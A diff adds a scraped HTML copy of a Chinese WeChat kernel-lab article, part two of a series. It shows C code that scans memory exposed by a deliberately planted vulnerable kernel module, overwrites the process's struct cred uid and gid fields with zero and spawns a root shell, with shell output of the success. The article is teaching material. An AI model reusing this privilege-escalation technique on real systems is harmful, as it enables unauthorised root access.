@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<head>
+	<meta http-equiv='Content-Type' content='text/html;charset=utf-8'>
+	<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>
+	<title>
+		怎样在Linux内核中埋炸弹获取root权限&lt;2-2&gt;终结篇
+	</title>
+	<script src='https://cdn.bootcss.com/jquery/1.10.2/jquery.min.js'>
+	</script>
+	<style>
+		a {color: #607fa6;text-decoration:none;word-wrap:break-word;word-break:break-all;}.rich_media_title{padding-bottom:10px;margin-bottom:14px;border-bottom:1px solid #e7e7eb;font-weight:400;} .rich_media_meta_list{font-size:14px;margin-bottom: 22px;}
+		.rich_media_meta{display:inline-block;vertical-align:middle;margin-right:8px;margin-bottom:10px;font-size:14px;}.rich_media_meta_text{color:#8c8c8c;color:rgba(0, 0, 0, 0.3)}.rich_media_meta_list
+		em {font-style: normal;}@media screen and (max-width:768px){.rich_media{position:
+		relative;padding: 20px 15px 15px;background-color: #fff;}}.rich_media_content{text-align:justify;} .rich_media_content * {max-width:100%!important;box-sizing: border-box!important;-webkit-box-sizing:
+		border-box!important;word-wrap: break-word!important;}.rich_media_content
+		blockquote {margin: 0;padding-left: 10px;border-left: 3px solid #dbdbdb;}.rich_media_content
+		.list-paddingleft-2 {padding-left: 2.2em;}a.rich_media_meta_nickname{display: none;}@media screen and (min-width:1025px){.rich_media{position:relative;}a.rich_media_meta_nickname{display:inline-block!important;}span.rich_media_meta_nickname
+		{display: inline-block!important;}.rich_media {width:677px;margin-left:auto;margin-right:auto;}}a.fwjm{font-size: 12px;color: #ececec;}.tenvideo_player {position: relative;width:
+		100 %;height: 100 %;margin: auto;background: #000;}* {margin:0px;padding:0px;} body{line-height: 1.6;letter-spacing: .034em;}
+		.dy_all {text-align: center;margin: 30px 0;} .dy_all a {display: inline-block;height:
+		38px;line-height: 38px;padding: 0 18px;background-color: #009688;color:
+		#fff;white-space: nowrap;font-size: 14px;border: none;border-radius: 2px;cursor:
+		pointer;text-align: center;outline: 0;-webkit-appearance: none;transition:
+		all .3s;-webkit-transition: all .3s;box-sizing: border-box;} img{max-width: 677px!important;}
+
+		.crawler-info{padding: 8px 0;} .article-link>img{margin-left: 20px;width: 16px;}
+		.comment-item::before,.comment-item::after{content:'';display:block;height:0;visibility:hidden;clear:both;*zoom:1;} .comment-item{margin-bottom:30px;}
+		.avatar{width:12%; padding-right:10px;float:left;box-sizing:border-box;} .avatar img{width:100%;}
+		.comment-body{float:left;width:88%;} .comment-body .comment-info{color:#b3b3b3;margin-bottom:4px;margin-top: -5px;} .comment-body .comment-info>span:last-child{float:right;} 
+		.comment-author{border-left:4px solid green;padding-left:6px;margin:8px 0;}
+
+		@media screen and (max-width: 420px) {.article-link>img {margin-left: 0px;}}
+		@media screen and (min-width: 480px) {.avatar {width: 9%;}.comment-body {width: 91%;}}
+	</style>
+</head>
+<body>
+	<div id='js_article' class='rich_media'>
+		<div class="crawler-info">
+			<a href='https://www.52pojie.cn' class='fwjm' target='_blank'>
+				提供的爬取软件来源于：52pojie.cn@夜泉 免费下载使用
+			</a>
+			<a href='https://mp.weixin.qq.com/s?__biz=MzI3NzA5MzUxNA==&amp;mid=2664606718&amp;idx=1&amp;sn=78a5ae8e1f9e6f59adfaa7ab5fda1cfa&amp;chksm=f04d861bc73a0f0dc659a5284f4c3a04f8090e3a541e06d885a59df4e13bbd6ca02b4e2e3545&amp;scene=27#wechat_redirect&cpage=1' target='_blank' class="article-link">
+				<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAMAAABA3o1rAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ1IDc5LjE2MzQ5OSwgMjAxOC8wOC8xMy0xNjo0MDoyMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTkgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjk4QUEzQzVDNkNGQjExRTk5NzNBQ0VBMjgzMjY1NjkwIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjk4QUEzQzVENkNGQjExRTk5NzNBQ0VBMjgzMjY1NjkwIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6OThBQTNDNUE2Q0ZCMTFFOTk3M0FDRUEyODMyNjU2OTAiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6OThBQTNDNUI2Q0ZCMTFFOTk3M0FDRUEyODMyNjU2OTAiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5TKSKsAAAAclBMVEUuLi77+/stLS1VVVXx8fFOTk7s7Ozt7e1qamp5eXlNTU2WlpZFRUU6Ojrq6urn5+d/f3/8/Pw9PT0/Pz+YmJg8PDyZmZlAQECfn5+QkJBBQUFra2vo6OhDQ0OSkpKenp5WVlY+Pj7r6+tpaWksLCz///9o6ILHAAAAJnRSTlP/////////////////////////////////////////////////AKd6gbwAAACNSURBVHjajJHpEoIwDISDVMotcnuCmLz/K9KCdlqO6v7p7Mw3yW4KxG85fnUkIVfZ5J0SsCtqcgRw0HzjQYY2AAOIdRuaK4ReAPJ5nmglL5qICahpU60C0uXguQ9TgIwGJoDnT9z/ABmxt60ot0N2CsDLfb9mvBxs9ql+n5o9bEDBgbif7/1F4g80CjAAqrVAnnsm5f8AAAAASUVORK5CYII=" />
+			</a>
+		</div>
+		<div id="img-content">
+
+                
+                <h2 class="rich_media_title" id="activity-name">怎样在Linux内核中埋炸弹获取root权限&lt;2/2&gt;终结篇</h2>
+                <div id="meta_content" class="rich_media_meta_list">
+                                                                                                                            
+                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt"><a href="javascript:void(0);">Linux内核之旅</a>
+                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
+                          <div class="profile_inner">
+                              <strong class="profile_nickname">Linux内核之旅</strong>
+                              <img class="profile_avatar" id="js_profile_qrcode_img" src="" alt="">
+
+                              <p class="profile_meta">
+                              <label class="profile_meta_label">微信号</label>
+                              <span class="profile_meta_value">LinuxKernelTravel</span>
+                              </p>
+
+                              <p class="profile_meta">
+                              <label class="profile_meta_label">功能介绍</label>
+                              <span class="profile_meta_value">Linux内核之旅</span>
+                              </p>
+                              
+                          </div>
+                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
+                              <i class="profile_arrow arrow_out"></i>
+                              <i class="profile_arrow arrow_in"></i>
+                          </span>
+                      </div>
+                    </span>
+
+
+                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2019-07-26</em>
+
+
+
+
+
+                </div>
+
+                
+                
+                                <a class="original_area_primary" id="copyright_info" href="##" style="visibility:hidden">
+                    <span class="tips_global_primary">文章转载自公众号</span>
+                    <span class="radius_avatar">
+                                            <img class="avatar" src="http://wx.qlogo.cn/mmhead/Q3auHgzwzM5xicOAr84Aiaol5dSXdBgP668gR4hovaLZEGrwyqLICkww/0" alt="相遇Linux">
+                                          </span>
+                    <span class="original_primary_nickname rich_media_meta_link js_nickname">相遇Linux</span>
+                                        <span class="tips_global_primary" id="js_comma">，</span>
+                    <span class="original_primary_author_wrp tips_global_primary" id="js_author">
+                      作者                                            JeffXie
+                                          </span>
+                                    </a>
+                                
+                
+                
+                
+                                                
+                                                                
+                                
+                
+                <div class="rich_media_content " id="js_content">
+                    
+
+                    
+
+                    
+                    
+                    <p>上文中的漏洞内核模块代码和应用层代码两者狼狈为奸，修改了系统内存中所有的<span style="color: rgb(0, 209, 0);">jeffnice+20</span>为<span style="color: rgb(255, 0, 0);">jeffnice-19</span>。<br  /></p><p><br  /></p><p>普通用户既然能修改系统任意内存，那把自己的权限提升为root权限应该也不是一件难事了。<br  /></p><p><br  /></p><p>linux内核使用struct cred 结构体来表达一个进程的<span style="color: rgb(255, 0, 0);">credential（凭证）</span></p><p><span style="color: rgb(255, 0, 0);"><br  /></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cpp"><code><span class="code-snippet_outer"><span class="code-snippet__class"><span class="code-snippet__keyword">struct</span> <span class="code-snippet__title">cred</span> {</span></span></code><code><span class="code-snippet_outer">  ...</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">kuid_t</span>    uid;    <span class="code-snippet__comment">/* real UID of the task */</span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">kgid_t</span>    gid;    <span class="code-snippet__comment">/* real GID of the task */</span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">kuid_t</span>    suid;    <span class="code-snippet__comment">/* saved UID of the task */</span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">kgid_t</span>    sgid;    <span class="code-snippet__comment">/* saved GID of the task */</span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">kuid_t</span>    euid;    <span class="code-snippet__comment">/* effective UID of the task */</span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">kgid_t</span>    egid;    <span class="code-snippet__comment">/* effective GID of the task */</span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">kuid_t</span>    fsuid;    <span class="code-snippet__comment">/* UID for VFS ops */</span></span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">kgid_t</span>    fsgid;    <span class="code-snippet__comment">/* GID for VFS ops */</span></span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  ...</span></code><code><span class="code-snippet_outer">};</span></code></pre></section><p><br  /></p><p>那我们现在就有思路了，我们只需要修改本进程对应的struct cred结构中的8个变量跟root用户的一样就行。<br  /></p><p><br  /></p><p>首先看看root用户运行的程序对应的上面结构中的8个变量是什么。</p><p><br  /></p><p><strong>在系统中以root用户查看当前bash进程($$)对应的</strong><span style="color: rgb(0, 209, 0);"><strong>uid</strong></span><strong>和</strong><span style="color: rgb(0, 209, 0);"><strong>gid</strong></span></p><p>root@jeff:/# cat /proc/$$/status</p><p>Name:<span style="white-space:pre;">	</span>bash</p><p>State:<span style="white-space:pre;">	</span>S (sleeping)</p><p>Tgid:<span style="white-space:pre;">	</span>15684</p><p>Ngid:<span style="white-space:pre;">	</span>0</p><p>Pid:<span style="white-space:pre;">	</span>15684</p><p>PPid:<span style="white-space:pre;">	</span>15680</p><p>TracerPid:<span style="white-space:pre;">	</span>0</p><p><span style="color: rgb(255, 0, 0);">Uid:&nbsp; 0<span style="white-space: pre;">	</span>0<span style="white-space: pre;">	</span>0<span style="white-space: pre;">	</span>0</span></p><p><span style="color: rgb(255, 0, 0);">Gid:<span style="white-space: pre;">	</span>0<span style="white-space: pre;">	</span>0<span style="white-space: pre;">	</span>0<span style="white-space: pre;">	</span>0</span></p><p>FDSize:<span style="white-space:pre;">	</span>256</p><p>Groups:<span style="white-space:pre;">	</span>0&nbsp;</p><p>NStgid:<span style="white-space:pre;">	</span>15684</p><p>NSpid:<span style="white-space:pre;">	</span>15684</p><p>NSpgid:<span style="white-space:pre;">	</span>15684</p><p>NSsid:<span style="white-space:pre;">	</span>14057</p><p><br  /></p><p><strong>现在切换到普通用户查看当前bash进程($$)对应的</strong><span style="color: rgb(0, 209, 0);"><strong>uid</strong></span><strong>和</strong><span style="color: rgb(0, 209, 0);"><strong>gid</strong></span><br  /></p><p><span style="color: rgb(0, 209, 0);">jeff</span>@jeff:~$ cat /proc/$$/status</p><p>Name:<span style="white-space:pre;">	</span>bash</p><p>State:<span style="white-space:pre;">	</span>S (sleeping)</p><p>Tgid:<span style="white-space:pre;">	</span>20882</p><p>Ngid:<span style="white-space:pre;">	</span>0</p><p><span style="color: rgb(255, 0, 0);">Pid:<span style="white-space: pre;">	</span>20882</span></p><p>PPid:<span style="white-space:pre;">	</span>20881</p><p>TracerPid:<span style="white-space:pre;">	</span>0</p><p><span style="color: rgb(255, 0, 0);">Uid:<span style="white-space: pre;">	</span>1003<span style="white-space: pre;">	</span>1003<span style="white-space: pre;">	</span>1003<span style="white-space: pre;">	</span>1003</span></p><p><span style="color: rgb(255, 0, 0);">Gid:<span style="white-space: pre;">	</span>1003<span style="white-space: pre;">	</span>1003<span style="white-space: pre;">	</span>1003<span style="white-space: pre;">	</span>1003</span></p><p>FDSize:<span style="white-space:pre;">	</span>256</p><p>Groups:<span style="white-space:pre;">	</span>1003&nbsp;</p><p>NStgid:<span style="white-space:pre;">	</span>20882</p><p>NSpid:<span style="white-space:pre;">	</span>20882</p><p>NSpgid:<span style="white-space:pre;">	</span>20882</p><p>NSsid:<span style="white-space:pre;">	</span>20866</p><p>VmPeak:<span style="white-space:pre;">	</span>&nbsp; &nbsp;26412 kB</p><p>VmSize:<span style="white-space:pre;">	</span>&nbsp; &nbsp;26412 kB</p><p><br  /></p><p>现在在普通用户jeff终端下执行的程序，它的uid和gid也会跟上面的父进程(bash)进程一样，都会是<span style="color: rgb(255, 0, 0);">1003</span>. 而现在知道了root用户的所有uid和gid都是<span style="color: rgb(255, 0, 0);">0</span>.</p><p>我们的思路是，在普通用户jeff的终端下执行的程序，利用修改内存功能把自己进程对应的所有uid和gid都变成0，然后在程序中调用getuid()查看是否等于0，如果等于0,就说明普通用户jeff已经拿到了root权限。</p><p><br  /></p><p>代码：jeff-mmap.c （代码有删减）<br  /></p><p><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="swift"><code><span class="code-snippet_outer">        printf(<span class="code-snippet__string">"[+]mmap ok addr: %lx\n"</span>, addr);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">while</span> (((unsigned long)addr) &lt; (mmapStart + size))</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__built_in">count</span> = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">if</span> (</span></code><code><span class="code-snippet_outer">        addr[<span class="code-snippet__built_in">count</span>++] == uid &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[<span class="code-snippet__built_in">count</span>++] == uid &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[<span class="code-snippet__built_in">count</span>++] == uid &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[<span class="code-snippet__built_in">count</span>++] == uid &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[<span class="code-snippet__built_in">count</span>++] == uid &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[<span class="code-snippet__built_in">count</span>++] == uid &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[<span class="code-snippet__built_in">count</span>++] == uid &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[<span class="code-snippet__built_in">count</span>++] == uid </span></code><code><span class="code-snippet_outer">        ) { </span></code><code><span class="code-snippet_outer">                credNum ++; </span></code><code><span class="code-snippet_outer">                printf(<span class="code-snippet__string">"[+]found ptr:%p ,crednum:%d\n"</span>, addr, credNum);</span></code><code><span class="code-snippet_outer">                <span class="code-snippet__built_in">count</span> = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">                addr[<span class="code-snippet__built_in">count</span>++] = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">                addr[<span class="code-snippet__built_in">count</span>++] = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">                addr[<span class="code-snippet__built_in">count</span>++] = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">                addr[<span class="code-snippet__built_in">count</span>++] = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">                addr[<span class="code-snippet__built_in">count</span>++] = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">                addr[<span class="code-snippet__built_in">count</span>++] = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">                addr[<span class="code-snippet__built_in">count</span>++] = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">                addr[<span class="code-snippet__built_in">count</span>++] = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">                <span class="code-snippet__keyword">if</span> (getuid() == <span class="code-snippet__number">0</span>) {</span></code><code><span class="code-snippet_outer">                        printf(<span class="code-snippet__string">"[+] root successed.\n"</span>);</span></code><code><span class="code-snippet_outer">                        execl(<span class="code-snippet__string">"/bin/sh"</span>, <span class="code-snippet__string">"-"</span>, (char *)<span class="code-snippet__type">NULL</span>);</span></code><code><span class="code-snippet_outer">                        printf(<span class="code-snippet__string">"Execl Failed.\n"</span>);</span></code><code><span class="code-snippet_outer">                        <span class="code-snippet__keyword">break</span>;</span></code><code><span class="code-snippet_outer">                }   </span></code><code><span class="code-snippet_outer">                <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">                        <span class="code-snippet__built_in">count</span> = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">                        addr[<span class="code-snippet__built_in">count</span>++] = uid;</span></code><code><span class="code-snippet_outer">                        addr[<span class="code-snippet__built_in">count</span>++] = uid;</span></code><code><span class="code-snippet_outer">                        addr[<span class="code-snippet__built_in">count</span>++] = uid;</span></code><code><span class="code-snippet_outer">                        addr[<span class="code-snippet__built_in">count</span>++] = uid;</span></code><code><span class="code-snippet_outer">                        addr[<span class="code-snippet__built_in">count</span>++] = uid;</span></code><code><span class="code-snippet_outer">                        addr[<span class="code-snippet__built_in">count</span>++] = uid;</span></code><code><span class="code-snippet_outer">                        addr[<span class="code-snippet__built_in">count</span>++] = uid;</span></code><code><span class="code-snippet_outer">                        addr[<span class="code-snippet__built_in">count</span>++] = uid;</span></code><code><span class="code-snippet_outer">                }</span></code><code><span class="code-snippet_outer"><br  /></span></code></pre></section><p><strong>jeff@jeff:~$ gcc ./mmap-get-root.c -o mmap-get-root</strong></p><p><br  /></p><p>jeff@jeff:~$ ./mmap-get-root</p><p>[+] uid: 1003</p><p>[+]mmap ok addr: 57575000</p><p>[+]found ptr:0x8cab89c4 ,crednum:1</p><p>[+]found ptr:0x8cab8f04 ,crednum:2</p><p>[+]found ptr:0x1101f3604 ,crednum:3</p><p>[+] root successed.</p><p>#&nbsp;</p><p><strong>执行./mmap-get-root 发现已经</strong><span style="font-size: 18px;color: rgb(255, 0, 0);"><strong>root成功</strong></span><strong>了。</strong></p><p># cat /proc/$$/status</p><p>Name:<span style="white-space:pre;">	</span>sh</p><p>State:<span style="white-space:pre;">	</span>S (sleeping)</p><p>Tgid:<span style="white-space:pre;">	</span>20973</p><p>Ngid:<span style="white-space:pre;">	</span>0</p><p>Pid:<span style="white-space:pre;">	</span>20973</p><p><span style="color: rgb(255, 0, 0);">PPid:<span style="white-space: pre;">	</span>20882</span></p><p>TracerPid:<span style="white-space:pre;">	</span>0</p><p><span style="color: rgb(255, 0, 0);">Uid:<span style="white-space: pre;">	</span>0<span style="white-space: pre;">	</span>0<span style="white-space: pre;">	</span>0<span style="white-space: pre;">	</span>0</span></p><p><span style="color: rgb(255, 0, 0);">Gid:<span style="white-space: pre;">	</span>0<span style="white-space: pre;">	</span>0<span style="white-space: pre;">	</span>0<span style="white-space: pre;">	</span>0</span></p><p>FDSize:<span style="white-space:pre;">	</span>256</p><p>Groups:<span style="white-space:pre;">	</span>1003&nbsp;</p><p>NStgid:<span style="white-space:pre;">	</span>20973</p><p>NSpid:<span style="white-space:pre;">	</span>20973</p><p>NSpgid:<span style="white-space:pre;">	</span>20973</p><p>NSsid:<span style="white-space:pre;">	</span>20866</p><p>VmPeak:<span style="white-space:pre;">	</span>&nbsp; &nbsp; 4504 kB</p><p>VmSize:<span style="white-space:pre;">	</span>&nbsp; &nbsp; 4504 kB</p><p>VmLck:<span style="white-space:pre;">	</span>&nbsp; &nbsp; &nbsp; &nbsp;0 kB</p><p>VmPin:<span style="white-space:pre;">	</span>&nbsp; &nbsp; &nbsp; &nbsp;0 kB</p><p>VmHWM:<span style="white-space:pre;">	</span>&nbsp; &nbsp; &nbsp;748 kB</p><p>VmRSS:<span style="white-space:pre;">	</span>&nbsp; &nbsp; &nbsp;748 kB</p><p>VmData:<span style="white-space:pre;">	</span>&nbsp; &nbsp; &nbsp;192 kB</p><p>VmStk:<span style="white-space:pre;">	</span>&nbsp; &nbsp; &nbsp;132 kB</p><p>VmExe:<span style="white-space:pre;">	</span>&nbsp; &nbsp; &nbsp;144 kB</p><p><br  /></p><p>本进程的uid和gid都变成了0</p><p>(完）<br  /></p><p>本文的源代码和上一篇的源代码都在这里：<br  /></p><p>https://github.com/x-lugoo/linux-kernel-lab/tree/master/mmap-root</p><p>好看请点“在看”和赞赏！<br  /></p>
+                </div>
+                
+
+                
+  <div class="ct_mpda_wrp" id="js_sponsor_ad_area" style="display: none;"></div>
+
+
+                
+                <div class="read-more__area" id="js_more_read_area" style="display:none;">
+                    
+                </div>
+
+                
+                                <div class="reward_area tc reward_area_primary" id="js_preview_reward_author" style="display:none;">
+                    <div class="reward-avatar" style="display: none;" id="js_preview_reward_author_avatar">
+                        <img src="" alt="" id="js_preview_reward_author_head">
+                    </div>
+                    
+                                        <div class="reward-author" id="js_preview_reward_author_name">JeffXie</div>
+                                        <p class="reward_tips" id="js_preview_reward_author_wording" style="display:none;"></p>
+                    <p class="reward_button_wrp">
+                    
+                      <span class="reward_pop_panel">
+                        <img src="https://res.wx.qq.com/mpres/zh_CN/htmledition/pages/home/index/pic_mp_app4290ba.png" alt="">
+                        <strong>扫一扫下载订阅号助手，用手机发文章</strong>
+                      </span>
+                        <a class="reward_button" id='js_preview_reward_author_link' href="##"><span id="js_preview_reward_link_text">赞赏</span></a>
+                    </p>
+                </div>
+
+                <div class="reward_qrcode_area reward_area tc" id="js_preview_reward_qrcode" style="display:none;">
+                    <p class="tips_global">长按二维码向我转账</p>
+                    <p id="js_preview_reward_ios_wording" class="reward_tips" style="display:none;"></p>
+                    <span class="reward_qrcode_img_wrp"><img class="reward_qrcode_img" src="res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_reward_qrcode.2x42f400.png"></span>
+                    <p class="tips_global">受苹果公司新规定影响，微信 iOS 版的赞赏功能被关闭，可通过二维码转账支持公众号。</p>
+                </div>
+                            </div>
+		<div class="comment">
+			<h3 style="margin:26px 0;font-weight:100;padding-bottom:4px;border-bottom:1px solid #ccc;">精选留言</h3>
+		    暂无...
+		</div>
+	</div>
+	<div class='dy_all'>
+		<a href='https://www.52pojie.cn/' target='_blank'>
+			吾爱破解论坛
+		</a>
+	</div>
+</body>
